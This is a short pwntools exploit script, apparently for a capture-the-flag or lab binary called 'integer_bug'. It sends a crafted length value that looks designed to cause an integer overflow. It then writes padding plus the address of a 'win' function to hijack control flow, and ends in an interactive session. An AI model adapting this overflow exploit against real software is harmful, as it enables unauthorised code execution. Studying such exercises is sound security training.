from pwn import *

e = ELF('./integer_bug')

p = e.process()

# pause()
p.recvline()
p.sendline(str(0x10000 - 0x28).encode())
p.recvline()
p.sendline(b'1')
p.recvline()
p.sendline(b'1')
p.recvline()
p.send(b'A'*0x18 + p64(e.sym['win']))

p.interactive()
